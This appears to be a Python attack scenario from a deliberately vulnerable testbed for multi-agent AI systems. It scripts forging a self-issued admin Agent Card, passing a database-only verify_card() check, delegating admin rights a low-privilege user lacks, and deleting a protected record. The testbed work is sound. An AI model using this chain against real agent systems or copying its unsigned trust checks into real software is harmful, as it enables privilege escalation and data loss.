"""
Scenario 19: Agent Card Forgery & Trust Chain Attack

Category: Identity & Trust
Difficulty: Medium
Threats: IT-07, IT-08, C-03

This scenario exploits the Agent Card MCP's lack of issuer validation (IT-07)
and simplistic card verification (IT-08) to create a rogue agent that is
trusted by the system. The verify_card() function just checks the database —
no cryptographic signature check — so any self-issued card is accepted.

Attack Flow:
1. Create a rogue agent identity in the database
2. Issue a fake Agent Card with "admin" and "full_access" capabilities
3. Verify the fake card — passes because verify_card() trusts the DB
4. Create delegation from a user to the rogue agent
5. Execute privileged actions with the rogue agent's forged trust
"""

from uuid import UUID, uuid4
from loguru import logger

from src.scenarios import AttackScenario, AttackStep, Criterion, ScenarioCategory, ScenarioDifficulty
from src.database.connection import get_db
from src.database.queries import (
    create_identity,
    create_delegation,
    get_identity_by_id,
    get_audit_logs,
)
from src.database.models import AgentCard, AppData, Identity
from src.identity.context import IdentityContext
from src.mcps.agent_card_mcp import AgentCardMCPServer
from src.mcps.data_mcp import DataMCPServer


# Shared state for scenario
scenario_state = {
    "attacker_user_id": None,   # Attacker (low-priv user)
    "rogue_agent_id": None,     # Rogue agent created by attacker
    "legitimate_agent_id": None,  # Legitimate agent for comparison
    "admin_user_id": None,      # Admin user
    "card_id": None,            # Forged card ID
    "verify_result": None,      # Result of verify_card on rogue agent
    "delegation_id": None,      # Delegation from attacker to rogue
    "test_record_id": None,     # Record only admins should delete
    "delete_result": None,      # Result of privileged action
}


def setup_scenario():
    """Set up the scenario with attacker user, rogue agent, and test data."""
    logger.info("Setting up Scenario 19: Agent Card Forgery & Trust Chain Attack")

    with get_db() as db:
        # Create attacker user (low-privilege)
        attacker = create_identity(
            db,
            identity_type="user",
            name="Eve (Attacker S19)",
            email="eve-s19@test.com",
            permissions=["read"]
        )
        scenario_state["attacker_user_id"] = attacker.id

        # Create admin user (for reference)
        admin = create_identity(
            db,
            identity_type="user",
            name="Admin (S19)",
            email="admin-s19@test.com",
            permissions=["admin", "delete", "read", "write"]
        )
        scenario_state["admin_user_id"] = admin.id

        # Create rogue agent identity
        rogue_agent = create_identity(
            db,
            identity_type="agent",
            name="rogue-agent-s19",
            permissions=["read"]  # Initially low permissions
        )
        scenario_state["rogue_agent_id"] = rogue_agent.id

        # Create a legitimate agent for comparison
        legit_agent = create_identity(
            db,
            identity_type="agent",
            name="legitimate-agent-s19",
            permissions=["read", "write"]
        )
        scenario_state["legitimate_agent_id"] = legit_agent.id

        # Create a sensitive test record
        test_record = AppData(
            table_name="test_table",
            data={"content": "admin_only_data", "classification": "top_secret"},
            owner_id=admin.id,
        )
        db.add(test_record)
        db.commit()
        scenario_state["test_record_id"] = test_record.id
        db.commit()

    logger.info("✓ Setup complete: Eve (attacker), Admin, Rogue Agent, Legit Agent, test record")


def step1_issue_fake_agent_card():
    """Issue a fake Agent Card with admin capabilities — no issuer validation."""
    agent_card_mcp = AgentCardMCPServer()

    # Create an identity context for the attacker
    attacker_ctx = IdentityContext(
        user_id=scenario_state["attacker_user_id"],
        permissions={"read"},
    )

    # VULNERABILITY IT-07: issue_card has no issuer validation
    # Anyone can issue a card for any agent with any capabilities
    # The card is auto-set to is_verified=True!
    result = agent_card_mcp.issue_card(
        agent_id=str(scenario_state["rogue_agent_id"]),
        capabilities=["admin", "full_access", "delete", "write", "execute", "deploy"],
        public_key=None,  # No public key needed — not validated
        issuer_id=str(scenario_state["attacker_user_id"]),  # Self-issued!
        identity_context=attacker_ctx,
    )

    scenario_state["card_id"] = result.get("card_id")
    logger.info(f"Fake Agent Card issued: {result}")
    logger.info(f"  Card ID: {result.get('card_id')}")
    logger.info(f"  is_verified: {result.get('is_verified')} (auto-set to True!)")
    logger.info(f"  Capabilities: admin, full_access, delete, write, execute, deploy")
    return result.get("success", False)


def step2_verify_forged_card():
    """Verify the forged card — passes because verify_card() trusts the DB."""
    agent_card_mcp = AgentCardMCPServer()

    # Create identity context for verification
    ctx = IdentityContext(
        user_id=scenario_state["attacker_user_id"],
        permissions={"read"},
    )

    # VULNERABILITY IT-08: verify_card just checks DB, no cryptographic proof
    result = agent_card_mcp.verify_card(
        agent_id=str(scenario_state["rogue_agent_id"]),
        identity_context=ctx,
    )

    scenario_state["verify_result"] = result
    logger.info(f"Verify result for rogue agent: {result}")
    logger.info(f"  is_verified: {result.get('is_verified')}")
    logger.info(f"  capabilities: {result.get('capabilities')}")
    logger.info(f"  No cryptographic signature check performed!")
    return result.get("success", False) and result.get("is_verified", False)


def step3_establish_rogue_delegation():
    """Create delegation to rogue agent, granting it elevated permissions."""
    with get_db() as db:
        # Create delegation from attacker user to rogue agent
        # VULNERABILITY: Combined with the forged card, the rogue agent
        # now appears to be a trusted, verified agent with admin capabilities
        delegation = create_delegation(
            db,
            from_identity_id=scenario_state["attacker_user_id"],
            to_identity_id=scenario_state["rogue_agent_id"],
            permissions=["admin", "delete", "read", "write"]
        )
        scenario_state["delegation_id"] = delegation.id
        logger.info(f"Delegation created: Eve → Rogue Agent (ID: {delegation.id})")
        logger.info(f"  Delegated permissions: admin, delete, read, write")
    return True


def step4_execute_privileged_action():
    """Execute admin-level action with the rogue agent's forged trust."""
    data_mcp = DataMCPServer()

    # Create identity context for the rogue agent acting on behalf of attacker
    # The rogue agent now has:
    # 1. A verified Agent Card (forged, but accepted)
    # 2. A delegation from the attacker with admin permissions
    rogue_ctx = IdentityContext(
        user_id=scenario_state["attacker_user_id"],
        agent_id=scenario_state["rogue_agent_id"],
        delegation_chain=[
            scenario_state["attacker_user_id"],
            scenario_state["rogue_agent_id"],
        ],
        permissions={"admin", "delete", "read", "write"},
    )

    # Execute delete action — should only be allowed for verified, legitimate agents
    result = data_mcp.delete_data(
        table="app_data",
        record_id=str(scenario_state["test_record_id"]),
        identity_context=rogue_ctx,
    )

    scenario_state["delete_result"] = result
    logger.info(f"Privileged action result: {result}")
    logger.info(f"  deleted_by (rogue agent): {result.get('deleted_by')}")
    return result.get("success", False)


def step5_verify_trust_chain_deception():
    """Verify the trust chain shows rogue agent as trusted — complete deception."""
    agent_card_mcp = AgentCardMCPServer()
    ctx = IdentityContext(
        user_id=scenario_state["attacker_user_id"],
        permissions={"read"},
    )

    # Re-verify the card to confirm it's still trusted
    verify_result = agent_card_mcp.verify_card(
        agent_id=str(scenario_state["rogue_agent_id"]),
        identity_context=ctx,
    )

    # Check the database for the card details
    with get_db() as db:
        card = db.query(AgentCard).filter(
            AgentCard.agent_id == scenario_state["rogue_agent_id"]
        ).first()

        if card:
            logger.info(f"Trust chain shows:")
            logger.info(f"  Agent: rogue-agent-s19")
            logger.info(f"  is_verified: {card.is_verified}")
            logger.info(f"  capabilities: {card.capabilities}")
            logger.info(f"  issuer_id: {card.issuer_id} (self-issued by attacker!)")
            logger.info(f"  No signature or trust authority validation performed")

        # Check audit logs
        logs = get_audit_logs(db, limit=10)
        for log in logs:
            if log.action == "mcp_tool_call:delete_data":
                logger.info(f"  Audit log: action by {log.identity_id} (rogue agent or attacker)")

    return verify_result.get("is_verified", False)


# ── Success Criteria ──────────────────────────────────────────────────────────


def criterion_fake_card_accepted():
    """Check if the fake Agent Card was accepted as valid."""
    verify_result = scenario_state.get("verify_result")
    if not verify_result:
        return False
    return verify_result.get("success", False) and verify_result.get("is_verified", False)


def criterion_rogue_agent_trusted():
    """Check if the rogue agent is trusted by the system (card verified + delegation)."""
    # Card must be verified
    verify_result = scenario_state.get("verify_result")
    if not verify_result or not verify_result.get("is_verified", False):
        return False

    # Delegation must exist
    if not scenario_state.get("delegation_id"):
        return False

    # Check card capabilities include admin
    capabilities = verify_result.get("capabilities", [])
    return "admin" in capabilities and "full_access" in capabilities


def criterion_privileged_action_executed():
    """Check if privileged action was executed by the rogue untrusted agent."""
    result = scenario_state.get("delete_result")
    return result is not None and result.get("success", False)


# ── Evidence Functions ────────────────────────────────────────────────────────


def evidence_fake_card():
    """Show evidence of fake Agent Card acceptance."""
    verify_result = scenario_state.get("verify_result")
    if verify_result:
        return (
            f"Forged card verified: is_verified={verify_result.get('is_verified')}, "
            f"capabilities={verify_result.get('capabilities')}, "
            f"issuer_id={verify_result.get('issuer_id')} (self-issued)"
        )
    return "No verify result available"


def evidence_rogue_trust():
    """Show evidence of rogue agent trust chain."""
    with get_db() as db:
        card = db.query(AgentCard).filter(
            AgentCard.agent_id == scenario_state["rogue_agent_id"]
        ).first()
        if card:
            return (
                f"Rogue agent card: is_verified={card.is_verified}, "
                f"capabilities={card.capabilities}, "
                f"issuer_id={card.issuer_id}, "
                f"delegation_id={scenario_state.get('delegation_id')}"
            )
    return "No card found for rogue agent"


def evidence_privileged_action():
    """Show evidence of privileged action execution."""
    result = scenario_state.get("delete_result")
    if result:
        return (
            f"Delete result: success={result.get('success')}, "
            f"deleted_by={result.get('deleted_by')}, "
            f"record_id={result.get('record_id')}"
        )
    return "Delete result not available"


# ── State Capture ─────────────────────────────────────────────────────────────


def capture_state_before():
    """Capture system state before attack."""
    with get_db() as db:
        attacker = get_identity_by_id(db, scenario_state["attacker_user_id"])
        rogue = get_identity_by_id(db, scenario_state["rogue_agent_id"])

        # Check for existing agent card
        card = db.query(AgentCard).filter(
            AgentCard.agent_id == scenario_state["rogue_agent_id"]
        ).first()

        from sqlalchemy import text
        result = db.execute(
            text("SELECT COUNT(*) FROM app_data WHERE id = :id"),
            {"id": str(scenario_state["test_record_id"])}
        )
        record_exists = result.scalar() > 0

        return {
            "attacker": attacker.to_dict() if attacker else None,
            "rogue_agent": rogue.to_dict() if rogue else None,
            "rogue_has_card": card is not None,
            "rogue_card_verified": card.is_verified if card else False,
            "test_record_exists": record_exists,
            "audit_log_count": len(get_audit_logs(db, limit=100)),
        }


def capture_state_after():
    """Capture system state after attack."""
    with get_db() as db:
        attacker = get_identity_by_id(db, scenario_state["attacker_user_id"])
        rogue = get_identity_by_id(db, scenario_state["rogue_agent_id"])

        # Check agent card
        card = db.query(AgentCard).filter(
            AgentCard.agent_id == scenario_state["rogue_agent_id"]
        ).first()

        from sqlalchemy import text
        result = db.execute(
            text("SELECT COUNT(*) FROM app_data WHERE id = :id"),
            {"id": str(scenario_state["test_record_id"])}
        )
        record_exists = result.scalar() > 0

        return {
            "attacker": attacker.to_dict() if attacker else None,
            "rogue_agent": rogue.to_dict() if rogue else None,
            "rogue_has_card": card is not None,
            "rogue_card_verified": card.is_verified if card else False,
            "rogue_card_capabilities": card.capabilities if card else [],
            "test_record_exists": record_exists,
            "test_record_deleted": not record_exists,
            "privileged_action_success": (scenario_state.get("delete_result") or {}).get("success", False),
            "audit_log_count": len(get_audit_logs(db, limit=100)),
        }


# ── Scenario Definition ──────────────────────────────────────────────────────


def create_scenario() -> AttackScenario:
    """Create Scenario 19: Agent Card Forgery & Trust Chain Attack."""
    return AttackScenario(
        id="S19",
        name="Agent Card Forgery & Trust Chain Attack",
        category=ScenarioCategory.IDENTITY_TRUST,
        difficulty=ScenarioDifficulty.MEDIUM,
        description=(
            "Exploit the Agent Card MCP's lack of issuer validation (IT-07) and "
            "simplistic card verification (IT-08) to create a rogue agent with "
            "forged admin capabilities. The verify_card() function just checks "
            "the database without cryptographic proof, so self-issued cards are "
            "accepted as verified."
        ),
        threat_ids=["IT-07", "IT-08", "C-03"],
        owasp_mappings=["ASI01", "ASI03", "ASI07"],

        # Setup
        setup=setup_scenario,

        # Attack steps
        attack_steps=[
            AttackStep(
                description="Issue fake Agent Card with admin/full_access capabilities (no issuer validation)",
                action=step1_issue_fake_agent_card,
                expected_outcome="Fake card issued with is_verified=True — self-signed, no validation",
                failure_message="Failed to issue fake Agent Card",
            ),
            AttackStep(
                description="Verify the forged card — passes (simplistic DB check, no crypto)",
                action=step2_verify_forged_card,
                expected_outcome="Forged card passes verification — no signature check performed",
                failure_message="Forged card verification failed",
            ),
            AttackStep(
                description="Create delegation from attacker to rogue agent with admin permissions",
                action=step3_establish_rogue_delegation,
                expected_outcome="Rogue agent now has delegation chain with admin permissions",
                failure_message="Failed to create delegation to rogue agent",
            ),
            AttackStep(
                description="Execute privileged delete action with rogue agent's forged trust",
                action=step4_execute_privileged_action,
                expected_outcome="Admin-level delete executed by untrusted rogue agent",
                failure_message="Failed to execute privileged action with rogue agent",
            ),
            AttackStep(
                description="Verify trust chain deception — rogue agent still shows as trusted",
                action=step5_verify_trust_chain_deception,
                expected_outcome="Rogue agent remains verified and trusted in the system",
                failure_message="Trust chain deception check failed",
            ),
        ],

        # Success criteria
        success_criteria=[
            Criterion(
                description="Fake Agent Card accepted as valid (is_verified=True)",
                check=criterion_fake_card_accepted,
                evidence=evidence_fake_card,
            ),
            Criterion(
                description="Rogue agent trusted by the system (verified card + admin capabilities)",
                check=criterion_rogue_agent_trusted,
                evidence=evidence_rogue_trust,
            ),
            Criterion(
                description="Privileged action executed by untrusted rogue agent",
                check=criterion_privileged_action_executed,
                evidence=evidence_privileged_action,
            ),
        ],

        # Observability
        state_before=capture_state_before,
        state_after=capture_state_after,
        observable_changes=[
            "Rogue agent issued a self-signed Agent Card (no issuer validation)",
            "Card auto-set to is_verified=True without cryptographic proof",
            "verify_card() accepted forged card (DB-only check, IT-08)",
            "Rogue agent given admin delegation chain",
            "Sensitive record deleted by untrusted rogue agent",
        ],

        # Metadata
        agents_involved=["Orchestrator", "Executor"],
        mcps_involved=["Agent Card MCP", "Data MCP", "Identity MCP"],
        estimated_duration=30,
    )
